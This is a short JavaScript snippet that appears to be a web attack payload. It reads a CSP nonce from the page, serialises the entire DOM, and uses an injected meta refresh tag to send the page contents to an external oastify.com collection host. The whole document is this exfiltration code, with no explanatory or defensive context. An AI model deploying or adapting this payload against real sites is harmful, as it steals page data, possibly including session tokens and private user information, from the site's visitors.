// Get the nonce from the style tag
const nonce = document.getElementsByTagName('style')[0].nonce;


// Create meta refresh element
var meta = document.createElement('meta');
meta.setAttribute('http-equiv', 'refresh');

// Get all DOM content
var domContent = document.documentElement.outerHTML;

// Encode the DOM content for URL
var encodedDOM = encodeURIComponent(domContent);

// Set content with DOM data as parameter
meta.setAttribute('content', '0; url=https://uecy5aqm2v7el0ez2uo7hr1svj1ap1lpa.oastify.com/z2?dom2=' + encodedDOM);

// Append to document head
document.head.appendChild(meta);
